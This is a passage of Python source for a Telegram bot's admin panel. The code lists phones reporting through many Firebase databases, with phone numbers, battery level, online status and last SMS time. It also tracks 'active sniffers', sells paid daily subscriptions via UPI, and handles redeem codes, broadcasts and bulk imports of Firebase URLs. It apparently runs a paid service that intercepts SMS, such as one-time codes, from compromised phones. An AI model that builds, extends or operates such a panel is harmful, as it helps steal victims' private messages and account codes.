            f"📑 Duplicate Numbers: <code>{stats['duplicate_numbers']}</code>",
            "",
            "<b>URL-wise Breakdown:</b>",
        ]
        for i, (url, s) in enumerate(stats["url_stats"].items(), 1):
            pct = int((s["online"] / s["total"]) * 100) if s["total"] > 0 else 0
            short = url.replace("https://", "").split(".")[0][:20]
            lines.append(f"{i}. {short} — 🟢{s['online']}/🔴{s['total']-s['online']} ({pct}%)")

        await self._respond(update, context, "\n".join(lines))

    async def _action_online_devices(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        session = self.handlers.get_session(self.config.OWNER_ID)
        clients = await self.firebase.get_all_clients(session, force_refresh=True)
        online = [(k, v) for k, v in clients.items() if v.get("_is_online")]
        online.sort(key=lambda x: x[1].get("_last_sms_time", 0), reverse=True)

        lines = [f"🟢 <b>ONLINE DEVICES ({len(online)})</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        for i, (key, info) in enumerate(online[:50], 1):
            phone = info.get("_phone", "?")
            battery = info.get("battery", "?")
            src = info.get("_src_url", "").replace("https://", "").split(".")[0][:15]
            lines.append(f"{i}. <code>{phone}</code> | 🔋{battery} | 🌐{src}")

        if len(online) > 50:
            lines.append(f"\n... and {len(online) - 50} more online devices")

        await self._respond(update, context, "\n".join(lines))

    async def _action_offline_devices(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        session = self.handlers.get_session(self.config.OWNER_ID)
        clients = await self.firebase.get_all_clients(session, force_refresh=True)
        offline = [(k, v) for k, v in clients.items() if not v.get("_is_online")]

        lines = [f"🔴 <b>OFFLINE DEVICES ({len(offline)})</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        for i, (key, info) in enumerate(offline[:30], 1):
            phone = info.get("_phone", "?")
            src = info.get("_src_url", "").replace("https://", "").split(".")[0][:15]
            lines.append(f"{i}. <code>{phone}</code> | 🌐{src}")

        if len(offline) > 30:
            lines.append(f"\n... and {len(offline) - 30} more offline devices")

        await self._respond(update, context, "\n".join(lines))

    async def _action_duplicates_report(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        session = self.handlers.get_session(self.config.OWNER_ID)
        clients = await self.firebase.get_all_clients(session, force_refresh=True)
        phone_buckets: Dict[str, List[Dict]] = {}
        for key, info in clients.items():
            phone = str(info.get("_phone", "?"))
            if phone not in phone_buckets:
                phone_buckets[phone] = []
            phone_buckets[phone].append({"key": key, **info})

        duplicates = {p: items for p, items in phone_buckets.items() if len(items) > 1}

        lines = [f"📑 <b>DUPLICATE NUMBERS REPORT ({len(duplicates)})</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        for i, (phone, items) in enumerate(list(duplicates.items())[:20], 1):
            lines.append(f"\n{i}. <code>{phone}</code> — appears {len(items)} times:")
            for item in items:
                src = item.get("_src_url", "").replace("https://", "").split(".")[0][:18]
                status = "🟢" if item.get("_is_online") else "🔴"
                lines.append(f"   {status} 🌐{src}")

        if len(duplicates) > 20:
            lines.append(f"\n... and {len(duplicates) - 20} more duplicate groups")

        await self._respond(update, context, "\n".join(lines))

    async def _action_url_breakdown(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        stats = await self.get_device_analytics()
        lines = ["📈 <b>URL-WISE DEVICE BREAKDOWN</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        for i, (url, s) in enumerate(stats["url_stats"].items(), 1):
            pct = int((s["online"] / s["total"]) * 100) if s["total"] > 0 else 0
            bar_len = int(pct / 5)
            bar = "█" * bar_len + "░" * (20 - bar_len)
            lines.append(f"\n{i}. <code>{url}</code>")
            lines.append(f"   [{bar}] {pct}%")
            lines.append(f"   🟢 Online: {s['online']} | 🔴 Offline: {s['total'] - s['online']} | 📊 Total: {s['total']}")

        await self._respond(update, context, "\n".join(lines))

    async def _action_user_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        s = await self.get_user_statistics()
        text = (
            "👥 <b>USER STATISTICS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Registered: <code>{s['total']}</code>\n"
            f"✅ Active Subscriptions: <code>{s['active']}</code>\n"
            f"⏸️ Currently Paused: <code>{s['paused']}</code>\n"
            f"❌ Expired Users: <code>{s['expired']}</code>\n"
            f"♾️ Lifetime Members: <code>{s['lifetime']}</code>\n"
            f"🚫 Banned Users: <code>{s['banned']}</code>\n"
            f"🎯 Total Referrals: <code>{s['total_referrals']}</code>\n"
        )
        if s["total"] > 0:
            active_pct = int((s["active"] / s["total"]) * 100)
            text += f"\n📈 Active Rate: <code>{active_pct}%</code>"
        await self._respond(update, context, text)

    async def _action_view_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
        if not isinstance(users, dict):
            backup = LocalBackupManager.load_backup()
            users = backup.get("bot_users", {})
        if not isinstance(users, dict) or not users:
            await self._respond(update, context, "❌ No users found in database.")
            return

        now = int(time.time())
        lines = ["👥 <b>ALL REGISTERED USERS</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        user_list = []
        for uid_str, data in users.items():
            if not isinstance(data, dict):
                continue
            remaining = data.get("valid_until", 0) - now
            if data.get("paused", False):
                remaining = data.get("frozen_seconds", 0)
            status = "✅" if remaining > 0 else "❌"
            if data.get("valid_until", 0) >= 9999999999:
                status = "♾️"
            user_list.append((
                int(uid_str),
                data.get("first_name", "Unknown"),
                data.get("username", ""),
                status,
                remaining,
            ))
        user_list.sort(key=lambda x: x[4], reverse=True)

        for i, (uid, name, uname, status, rem) in enumerate(user_list[:40], 1):
            dur = UserService._format_duration(rem) if rem > 0 and status != "♾️" else ("Lifetime" if status == "♾️" else "Expired")
            u_tag = f"@{uname}" if uname else "—"
            lines.append(f"{i}. {status} <code>{uid}</code> | {escape(name)} ({u_tag}) — {dur}")

        if len(user_list) > 40:
            lines.append(f"\n... and {len(user_list) - 40} more users. Use /time for full export.")

        await self._respond(update, context, "\n".join(lines))

    async def _action_list_redeem(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        codes = self.load_redeem_codes()
        if not codes:
            await self._respond(update, context, "🎟️ No redeem codes found. Generate one first!")
            return

        lines = ["🎟️ <b>REDEEM CODES</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        for code, entry in codes.items():
            dur = UserService._format_duration(entry["duration_seconds"])
            used = entry["used_count"]
            max_u = entry["max_uses"]
            status = "✅ Active" if used < max_u else "❌ Used Up"
            lines.append(f"\n• <code>{code}</code> — {status}")
            lines.append(f"  ⏱️ Duration: {dur} | 👥 Uses: {used}/{max_u}")

        await self._respond(update, context, "\n".join(lines))

    async def _action_redeem_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        codes = self.load_redeem_codes()
        total = len(codes)
        active = sum(1 for c in codes.values() if c["used_count"] < c["max_uses"])
        used_up = total - active
        total_redeemed = sum(c["used_count"] for c in codes.values())
        total_seconds = sum(c["duration_seconds"] * c["used_count"] for c in codes.values())
        total_hours = total_seconds // 3600

        text = (
            "📊 <b>REDEEM CODE STATISTICS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎟️ Total Codes Created: <code>{total}</code>\n"
            f"✅ Currently Active: <code>{active}</code>\n"
            f"❌ Fully Used: <code>{used_up}</code>\n"
            f"🔢 Total Redemptions: <code>{total_redeemed}</code>\n"
            f"⏱️ Total Time Distributed: <code>{total_hours}h</code>"
        )
        await self._respond(update, context, text)

    async def _action_list_banned(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        banned = self.load_banned()
        if not banned:
            await self._respond(update, context, "🛡️ No banned users. Ban list is empty.")
            return

        lines = ["🚫 <b>BANNED USERS</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        for i, (uid_str, entry) in enumerate(banned.items(), 1):
            when = datetime.fromtimestamp(entry.get("banned_at", 0)).strftime("%Y-%m-%d %H:%M")
            lines.append(f"{i}. <code>{uid_str}</code>")
            lines.append(f"   Reason: {entry.get('reason', 'N/A')}")
            lines.append(f"   By: {entry.get('banned_by', 'Admin')} | {when}")
            lines.append("")

        await self._respond(update, context, "\n".join(lines))

    async def _action_revenue(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        s = await self.get_user_statistics()
        settings = self.load_settings()
        price = settings.get("price_per_day", self.config.PRICE_PER_DAY)
        monthly_est = s["active"] * price * 30
        yearly_est = monthly_est * 12

        text = (
            "💰 <b>REVENUE ESTIMATE</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"💵 Price per day: ₹{price}\n"
            f"👥 Active subscribers: {s['active']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📅 Daily: ₹{s['active'] * price}\n"
            f"📆 Monthly (est): ₹{monthly_est}\n"
            f"🗓️ Yearly (est): ₹{yearly_est}\n"
            f"\n<i>Based on current active user count.</i>"
        )
        await self._respond(update, context, text)

    async def _action_referral_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
        if not isinstance(users, dict):
            backup = LocalBackupManager.load_backup()
            users = backup.get("bot_users", {})
        if not isinstance(users, dict):
            users = {}

        referrers = []
        total_ref = 0
        for uid_str, data in users.items():
            if not isinstance(data, dict):
                continue
            cnt = data.get("referral_count", 0)
            if cnt > 0:
                referrers.append((data.get("first_name", "Unknown"), cnt, int(uid_str)))
                total_ref += cnt

        referrers.sort(key=lambda x: x[1], reverse=True)

        lines = [
            "📈 <b>REFERRAL STATISTICS</b>",
            "━━━━━━━━━━━━━━━━━━━━━",
            f"🎯 Total Referrals: <code>{total_ref}</code>",
            f"👥 Users With Referrals: <code>{len(referrers)}</code>",
            f"🎁 Bonus Hours Each: <code>{self.config.REFERRAL_BONUS_HOURS}h</code>",
            f"⏱️ Total Hours Distributed: <code>{total_ref * self.config.REFERRAL_BONUS_HOURS}h</code>",
            "",
            "<b>🏆 Top Referrers:</b>",
        ]
        for i, (name, cnt, uid) in enumerate(referrers[:10], 1):
            lines.append(f"{i}. {escape(name)} (<code>{uid}</code>) — {cnt} referrals")

        await self._respond(update, context, "\n".join(lines))

    async def _action_full_report(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        status_msg = await safe_send_message(context, update.effective_chat.id, "📦 Generating full report...")
        user_stats = await self.get_user_statistics()
        device_stats = await self.get_device_analytics()
        redeem = self.load_redeem_codes()
        banned = self.load_banned()

        lines = [
            "=" * 50,
            "FULL ADMIN REPORT",
            f"Generated: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
            "=" * 50,
            "",
            "━━━ USER STATISTICS ━━━",
            f"Total Users: {user_stats['total']}",
            f"Active: {user_stats['active']}",
            f"Expired: {user_stats['expired']}",
            f"Paused: {user_stats['paused']}",
            f"Lifetime: {user_stats['lifetime']}",
            f"Banned: {user_stats['banned']}",
            f"Total Referrals: {user_stats['total_referrals']}",
            "",
            "━━━ DEVICE STATISTICS ━━━",
            f"Total URLs: {device_stats['total_urls']}",
            f"Total Devices: {device_stats['total_devices']}",
            f"Online: {device_stats['online']}",
            f"Offline: {device_stats['offline']}",
            f"Duplicate Numbers: {device_stats['duplicate_numbers']}",
            "",
            "━━━ URL BREAKDOWN ━━━",
        ]
        for url, s in device_stats["url_stats"].items():
            lines.append(f"  {url}")
            lines.append(f"    Online: {s['online']} | Total: {s['total']}")

        lines.extend([
            "",
            "━━━ REDEEM CODES ━━━",
            f"Total Codes: {len(redeem)}",
            f"Total Redemptions: {sum(c['used_count'] for c in redeem.values())}",
            "",
            "━━━ BANNED USERS ━━━",
            f"Total Banned: {len(banned)}",
        ])
        for uid_str, entry in banned.items():
            lines.append(f"  {uid_str} — {entry.get('reason', 'N/A')}")

        lines.append("\n" + "=" * 50)
        lines.append("END OF REPORT")
        lines.append("=" * 50)

        file_content = "\n".join(lines).encode("utf-8")
        if status_msg:
            await safe_delete_message(context, status_msg.chat_id, status_msg.message_id)
        await send_file_document(
            context=context,
            chat_id=update.effective_chat.id,
            file_bytes=file_content,
            filename=f"admin_full_report_{int(time.time())}.txt",
            caption="📦 <b>Full Admin Report Exported</b>",
        )

    async def _action_backup(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        backup = LocalBackupManager.load_backup()
        users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
        settings = self.load_settings()
        redeem = self.load_redeem_codes()
        banned = self.load_banned()

        full_backup = {
            "generated_at": datetime.utcnow().isoformat(),
            "local_backup": backup,
            "bot_users": users if isinstance(users, dict) else {},
            "bot_settings": settings,
            "redeem_codes": redeem,
            "banned_users": banned,
        }

        file_content = json.dumps(full_backup, indent=2, ensure_ascii=False).encode("utf-8")
        await send_file_document(
            context=context,
            chat_id=update.effective_chat.id,
            file_bytes=file_content,
            filename=f"bot_backup_{int(time.time())}.json",
            caption="💾 <b>Full Database Backup</b>",
        )

    async def _action_health(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        urls = await self.firebase.get_urls()
        sessions_count = len(self.handlers._user_sessions)
        active_sniffers = len(self.handlers.sms_service.active_sniffer_users)

        text = (
            "🩺 <b>SYSTEM HEALTH</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Firebase URLs: <code>{len(urls)}</code>\n"
            f"👤 Active User Sessions: <code>{sessions_count}</code>\n"
            f"🔍 Active Sniffers: <code>{active_sniffers}</code>\n"
            f"🐍 Python Version: <code>{sys.version.split()[0]}</code>\n"
            f"🕐 Uptime Reference: <code>{datetime.utcnow().strftime('%H:%M:%S UTC')}</code>\n"
            f"\n✅ All systems operational."
        )
        await self._respond(update, context, text)

    async def _action_force_join(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        text = (
            f"📢 <b>FORCE CHANNEL JOIN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"Channel: {escape(self.config.CHANNEL_USERNAME)}\n\n"
            f"✅ Channel verification is <b>ALREADY ENFORCED</b> for all non-owner users.\n"
            f"Users must join {escape(self.config.CHANNEL_USERNAME)} before accessing the bot.\n\n"
            f"To change the channel, use <b>⚙️ Bot Settings → 📢 Change Channel</b>."
        )
        await self._respond(update, context, text)

    # ──────────────────────────────────────────────────────────────────
    # Text Input Handler for Admin States
    # ──────────────────────────────────────────────────────────────────
    async def handle_text_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> bool:
        """Handle text responses for admin states. Returns True if handled."""
        uid = update.effective_user.id
        if uid != self.config.OWNER_ID:
            return False

        state = self.get_state(uid)
        if not state:
            return False

        state_name = state["state"]
        self.clear_state(uid)

        # ── Parse duration helper ──
        def parse_duration(s: str) -> Optional[int]:
            s = s.strip().lower()
            if s == "lifetime":
                return -1  # Sentinel for lifetime
            match = re.match(r"^(\d+)([hdmy])?$", s)
            if not match:
                return None
            val = int(match.group(1))
            unit = match.group(2) or "h"
            mult = {"h": 3600, "d": 86400, "m": 2592000, "y": 31536000}
            return val * mult.get(unit, 3600)

        # ── Bulk Firebase from text ──
        if state_name == "awaiting_admin_bulkfirebase":
            result = await self.bulk_add_firebase_from_text(text)
            lines = [f"📥 <b>Bulk Firebase Import Results</b>", "━━━━━━━━━━━━━━━━━━━━━"]
            lines.append(f"✅ Added: <code>{result['added']}</code> new URLs")
            lines.append(f"⚠️ Duplicates skipped: <code>{result['duplicates']}</code>")
            if result["rejected"]:
                lines.append(f"❌ Rejected: <code>{len(result['rejected'])}</code> invalid entries")
            if result["urls"]:
                lines.append("\n<b>Added URLs:</b>")
                for u in result["urls"]:
                    lines.append(f"• <code>{u}</code>")
            await self._respond(update, context, "\n".join(lines))
            return True

        # ── Add single URL ──
        if state_name == "awaiting_admin_addurl":
            cleaned = FirebaseService.clean_firebase_url(text)
            if not cleaned:
                await self._respond(update, context, "❌ Invalid Firebase URL format.")
                return True
            urls = await self.firebase.get_urls()
            if cleaned in urls:
                await self._respond(update, context, f"⚠️ URL already exists:\n<code>{cleaned}</code>")
                return True
            urls.append(cleaned)
            LocalBackupManager.update_key("firebase_urls", urls)
            await self.firebase.patch_data(self.config.PRIMARY_FIREBASE, "bot_config", {"firebase_urls": urls})
            await self.firebase.invalidate_url_cache()
            await self._respond(update, context, f"✅ URL added successfully:\n<code>{cleaned}</code>")
            return True

        # ── Delete URL ──
        if state_name == "awaiting_admin_delurl":
            try:
                idx = int(text.strip())
            except ValueError:
                await self._respond(update, context, "❌ Please enter a valid number.")
                return True
            if idx <= 1:
                await self._respond(update, context, "❌ Cannot remove primary URL (index 1).")
                return True
            urls = await self.firebase.get_urls()
            target_idx = idx - 1
            if target_idx < 0 or target_idx >= len(urls):
                await self._respond(update, context, f"❌ Index out of range. Total URLs: {len(urls)}")
                return True
            removed = urls.pop(target_idx)
            LocalBackupManager.update_key("firebase_urls", urls)
            await self.firebase.patch_data(self.config.PRIMARY_FIREBASE, "bot_config", {"firebase_urls": urls})
            await self.firebase.invalidate_url_cache()
            await self._respond(update, context, f"✅ Removed:\n<code>{removed}</code>")
            return True

        # ── Add Time ──
        if state_name in ("awaiting_admin_addtime", "awaiting_admin_settime"):
            parts = text.strip().split(maxsplit=1)
            if len(parts) < 2:
                await self._respond(update, context, "❌ Format: <code>user_id duration</code>")
                return True
            try:
                target_uid = int(parts[0])
            except ValueError:
                await self._respond(update, context, "❌ Invalid user ID.")
                return True
            dur = parse_duration(parts[1])
            if dur is None:
                await self._respond(update, context, "❌ Invalid duration. Use: 24h, 7d, 1m, 1y, lifetime")
                return True
            if dur == -1:
                if state_name == "awaiting_admin_addtime":
                    await self.user_service.add_time(target_uid, 0, is_lifetime=True)
                else:
                    await self.user_service.set_exact_time(target_uid, 0, is_lifetime=True)
                msg = f"✅ Set <b>LIFETIME</b> validity for user <code>{target_uid}</code>"
            else:
                if state_name == "awaiting_admin_addtime":
                    await self.user_service.add_time(target_uid, dur)
                    msg = f"✅ Added <b>{UserService._format_duration(dur)}</b> to user <code>{target_uid}</code>"
                else:
                    await self.user_service.set_exact_time(target_uid, dur)
                    msg = f"✅ Set validity to <b>{UserService._format_duration(dur)}</b> for user <code>{target_uid}</code>"
            await self._respond(update, context, msg)
            return True

        # ── Remove Time ──
        if state_name == "awaiting_admin_removetime":
            try:
                target_uid = int(text.strip())
            except ValueError:
                await self._respond(update, context, "❌ Invalid user ID.")
                return True
            await self.user_service.set_exact_time(target_uid, 0)
            await self._respond(update, context, f"✅ User <code>{target_uid}</code> has been expired.")
            return True

        # ── Search User ──
        if state_name == "awaiting_admin_searchuser":
            query = text.strip().lower()
            users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
            if not isinstance(users, dict):
                backup = LocalBackupManager.load_backup()
                users = backup.get("bot_users", {})
            matches = []
            for uid_str, data in users.items():
                if not isinstance(data, dict):
                    continue
                if (query in uid_str or
                    query in str(data.get("first_name", "")).lower() or
                    query in str(data.get("username", "")).lower()):
                    matches.append((int(uid_str), data))
            if not matches:
                await self._respond(update, context, f"❌ No users found matching '<code>{escape(query)}</code>'.")
                return True
            now = int(time.time())
            lines = [f"🔍 <b>Search Results ({len(matches)})</b>", "━━━━━━━━━━━━━━━━━━━━━"]
            for uid, data in matches[:15]:
                remaining = data.get("valid_until", 0) - now
                status = "✅" if remaining > 0 else "❌"
                if data.get("valid_until", 0) >= 9999999999:
                    status = "♾️"
                dur = UserService._format_duration(remaining) if remaining > 0 and status != "♾️" else ("Lifetime" if status == "♾️" else "Expired")
                lines.append(f"{status} <code>{uid}</code> | {escape(data.get('first_name', '?'))} (@{data.get('username', 'none')}) — {dur}")
            await self._respond(update, context, "\n".join(lines))
            return True

        # ── Reset User ──
        if state_name == "awaiting_admin_resetuser":
            try:
                target_uid = int(text.strip())
            except ValueError:
                await self._respond(update, context, "❌ Invalid user ID.")
                return True
            now = int(time.time())
            reset_data = {
                "user_id": target_uid,
                "valid_until": now + 86400,
                "referred_by": None,
                "referral_count": 0,
                "paused": False,
                "pause_count": 0,
                "frozen_seconds": 0,
                "referred_list": [],
                "favorites": [],
            }
            existing = await self.firebase.get_user_data(target_uid)
            if existing:
                reset_data["first_name"] = existing.get("first_name", "")
                reset_data["username"] = existing.get("username", "")
                reset_data["joined_at"] = existing.get("joined_at", now)
            await self.firebase.save_user_data(target_uid, reset_data)
            await self._respond(update, context, f"✅ User <code>{target_uid}</code> has been reset. (24h free trial restored)")
            return True

        # ── Bulk Add Time ──
        if state_name == "awaiting_admin_bulkaddtime":
            dur = parse_duration(text.strip())
            if dur is None or dur == -1:
                await self._respond(update, context, "❌ Invalid duration. Use: 24h, 7d, 1m, 1y")
                return True
            users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
            if not isinstance(users, dict):
                backup = LocalBackupManager.load_backup()
                users = backup.get("bot_users", {})
            if not users:
                await self._respond(update, context, "❌ No users found.")
                return True
            count = 0
            for uid_str in users.keys():
                try:
                    await self.user_service.add_time(int(uid_str), dur)
                    count += 1
                except Exception:
                    pass
            await self._respond(update, context, f"✅ Bulk added <b>{UserService._format_duration(dur)}</b> to <code>{count}</code> users.")
            return True

        # ── Broadcast ──
        if state_name == "awaiting_admin_broadcast":
            users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
            if not isinstance(users, dict):
                backup = LocalBackupManager.load_backup()
                users = backup.get("bot_users", {})
            if not users:
                await self._respond(update, context, "❌ No users found.")
                return True
            asyncio.create_task(self.handlers._execute_broadcast(update, context, users, text))
            await self._respond(update, context, f"📢 Broadcast initiated!\nSending to <code>{len(users)}</code> users in background.")
            return True

        # ── Message User ──
        if state_name == "awaiting_admin_msguser":
            parts = text.strip().split(maxsplit=1)
            if len(parts) < 2:
                await self._respond(update, context, "❌ Format: <code>user_id your message</code>")
                return True
            try:
                target_uid = int(parts[0])
            except ValueError:
                await self._respond(update, context, "❌ Invalid user ID.")
                return True
            msg = parts[1]
            result = await safe_send_message(context, target_uid, f"📢 <b>Message from Admin:</b>\n\n{msg}")
            if result:
                await self._respond(update, context, f"✅ Message sent to user <code>{target_uid}</code>.")
            else:
                await self._respond(update, context, f"❌ Failed to send. User may have blocked the bot.")
            return True

        # ── Announcement ──
        if state_name == "awaiting_admin_announce":
            users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
            if not isinstance(users, dict):
                backup = LocalBackupManager.load_backup()
                users = backup.get("bot_users", {})
            if not users:
                await self._respond(update, context, "❌ No users found.")
                return True
            full_msg = f"📣 <b>ANNOUNCEMENT</b>\n━━━━━━━━━━━━━━━━━━━━━\n{text}"
            asyncio.create_task(self.handlers._execute_broadcast(update, context, users, full_msg))
            await self._respond(update, context, f"📣 Announcement sent to <code>{len(users)}</code> users.")
            return True

        # ── Gift All ──
        if state_name in ("awaiting_admin_giftall", "awaiting_admin_giftactive"):
            dur = parse_duration(text.strip())
            if dur is None or dur == -1:
                await self._respond(update, context, "❌ Invalid duration. Use: 1d, 7d, 1m, 1y")
                return True
            users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")
            if not isinstance(users, dict):
                backup = LocalBackupManager.load_backup()
                users = backup.get("bot_users", {})
            if not users:
                await self._respond(update, context, "❌ No users found.")
                return True
            now = int(time.time())
            count = 0
            for uid_str, data in users.items():
                try:
                    target_uid = int(uid_str)
                    if state_name == "awaiting_admin_giftactive":
                        remaining = data.get("valid_until", 0) - now
                        if remaining <= 0:
                            continue
                    await self.user_service.add_time(target_uid, dur)
                    count += 1
                except Exception:
                    pass
            await self._respond(update, context, f"🎁 Gifted <b>{UserService._format_duration(dur)}</b> to <code>{count}</code> users.")
            return True

        # ── Gift List ──
        if state_name == "awaiting_admin_giftlist":
            parts = text.strip().split(maxsplit=1)
            if len(parts) < 2:
                await self._respond(update, context, "❌ Format: <code>uid1,uid2,uid3 duration</code>")
                return True
            uid_list = [u.strip() for u in parts[0].split(",") if u.strip()]
            dur = parse_duration(parts[1])
            if dur is None or dur == -1:
                await self._respond(update, context, "❌ Invalid duration.")
                return True
            count = 0
            for uid_str in uid_list:
                try:
                    await self.user_service.add_time(int(uid_str), dur)
                    count += 1
                except Exception:
                    pass
            await self._respond(update, context, f"🎁 Gifted <b>{UserService._format_duration(dur)}</b> to <code>{count}/{len(uid_list)}</code> users.")
            return True

        # ── Generate Redeem Code ──
        if state_name == "awaiting_admin_genredeem":
            parts = text.strip().split()
            if len(parts) < 1:
                await self._respond(update, context, "❌ Format: <code>duration max_uses</code>")
                return True
            dur = parse_duration(parts[0])
            if dur is None or dur == -1:
                await self._respond(update, context, "❌ Invalid duration.")
                return True
            max_uses = int(parts[1]) if len(parts) > 1 else 1
            code = self.generate_redeem_code(dur, max_uses)
            await self._respond(
                update, context,
                f"🎟️ <b>REDEEM CODE GENERATED</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"Code: <code>{code}</code>\n"
                f"⏱️ Duration: {UserService._format_duration(dur)}\n"
                f"👥 Max Uses: {max_uses}\n\n"
                f"Users redeem with: <code>/redeem {code}</code>"
            )
            return True

        # ── Delete Redeem Code ──
        if state_name == "awaiting_admin_delredeem":
            code = text.strip().upper()
            codes = self.load_redeem_codes()
            if code in codes:
                del codes[code]
                self.save_redeem_codes(codes)
                await self._respond(update, context, f"✅ Redeem code <code>{code}</code> deleted.")
            else:
                await self._respond(update, context, f"❌ Code <code>{code}</code> not found.")
            return True

        # ── Settings: Price ──
        if state_name == "awaiting_admin_setprice":
            try:
                new_price = int(text.strip())
            except ValueError:
                await self._respond(update, context, "❌ Enter a valid number.")
                return True
            settings = self.load_settings()
            settings["price_per_day"] = new_price
            self.save_settings(settings)
            await self._respond(update, context, f"💰 Price updated to ₹{new_price}/day.")
            return True

        # ── Settings: Channel ──
        if state_name == "awaiting_admin_setchannel":
            channel = text.strip()
            if not channel.startswith("@"):
                await self._respond(update, context, "❌ Channel must start with @")
                return True
            settings = self.load_settings()
            settings["channel_username"] = channel
            self.save_settings(settings)
            await self._respond(update, context, f"📢 Channel updated to {escape(channel)}")
            return True

        # ── Settings: Owner ──
        if state_name == "awaiting_admin_setowner":
            try:
                new_owner = int(text.strip())
            except ValueError:
                await self._respond(update, context, "❌ Enter a valid numeric ID.")
                return True
            settings = self.load_settings()
            settings["owner_id"] = new_owner
            self.save_settings(settings)
            await self._respond(update, context, f"👤 Owner ID updated to <code>{new_owner}</code>")
            return True

        # ── Settings: UPI ──
        if state_name == "awaiting_admin_setupi":
            upi = text.strip()
            settings = self.load_settings()
            settings["upi_id"] = upi
            self.save_settings(settings)
            await self._respond(update, context, f"🏦 UPI ID updated to <code>{escape(upi)}</code>")
            return True

        # ── Settings: TTL ──
        if state_name == "awaiting_admin_setttl":
            try:
                ttl = int(text.strip())
            except ValueError:
                await self._respond(update, context, "❌ Enter a valid number of seconds.")
                return True
            settings = self.load_settings()
            settings["device_session_ttl"] = ttl
            self.save_settings(settings)
            await self._respond(update, context, f"⏱️ Session TTL updated to {ttl} seconds.")
            return True

        # ── Settings: Referral Bonus ──
        if state_name == "awaiting_admin_setreferral":
            try:
                hours = int(text.strip())
            except ValueError:
                await self._respond(update, context, "❌ Enter a valid number of hours.")
                return True
            settings = self.load_settings()
            settings["referral_bonus_hours"] = hours
            self.save_settings(settings)
            await self._respond(update, context, f"🎁 Referral bonus updated to +{hours}h.")
            return True

        # ── Ban User ──
        if state_name == "awaiting_admin_banuser":
            parts = text.strip().split(maxsplit=1)
            if len(parts) < 1:
                await self._respond(update, context, "❌ Format: <code>user_id reason</code>")
                return True
            try:
                target_uid = int(parts[0])
            except ValueError:
                await self._respond(update, context, "❌ Invalid user ID.")
                return True
            reason = parts[1] if len(parts) > 1 else "No reason provided"
            await self.ban_user(target_uid, reason, "Admin Panel")
            await self._respond(update, context, f"🚫 User <code>{target_uid}</code> banned.\nReason: {escape(reason)}")
            return True

        # ── Unban User ──
        if state_name == "awaiting_admin_unbanuser":
            try:
                target_uid = int(text.strip())
            except ValueError:
                await self._respond(update, context, "❌ Invalid user ID.")
                return True
            if await self.unban_user(target_uid):
                await self._respond(update, context, f"✅ User <code>{target_uid}</code> unbanned.")
            else:
                await self._respond(update, context, f"❌ User <code>{target_uid}</code> not found in ban list.")
            return True

        # ── Device Search ──
        if state_name == "awaiting_admin_devsearch":
            session = self.handlers.get_session(self.config.OWNER_ID)
            clients = await self.firebase.get_all_clients(session, force_refresh=True)
            query = text.strip().replace("+91", "").replace(" ", "")
            matches = []
            for key, info in clients.items():
                phone = str(info.get("_phone", ""))
                if query in phone:
                    matches.append((key, info))
            if not matches:
                await self._respond(update, context, f"❌ No devices found matching '<code>{escape(query)}</code>'.")
                return True
            lines = [f"🔍 <b>Device Search Results ({len(matches)})</b>", "━━━━━━━━━━━━━━━━━━━━━"]
            for i, (key, info) in enumerate(matches[:20], 1):
                phone = info.get("_phone", "?")
                status = "🟢" if info.get("_is_online") else "🔴"
                battery = info.get("battery", "?")
                src = info.get("_src_url", "").replace("https://", "").split(".")[0][:18]
                lines.append(f"{i}. {status} <code>{phone}</code> | 🔋{battery} | 🌐{src}")
            await self._respond(update, context, "\n".join(lines))
            return True

        return False

    # ──────────────────────────────────────────────────────────────────
    # Document Handler for Bulk Firebase File Upload
    # ──────────────────────────────────────────────────────────────────
    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
        """Handle .txt file uploads for bulk Firebase import."""
        uid = update.effective_user.id
        if uid != self.config.OWNER_ID:
            return False
        state = self.get_state(uid)
        if not state or state["state"] != "awaiting_admin_bulkfirebase":
            return False

        doc = update.message.document
        if not doc:
            return False
        if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
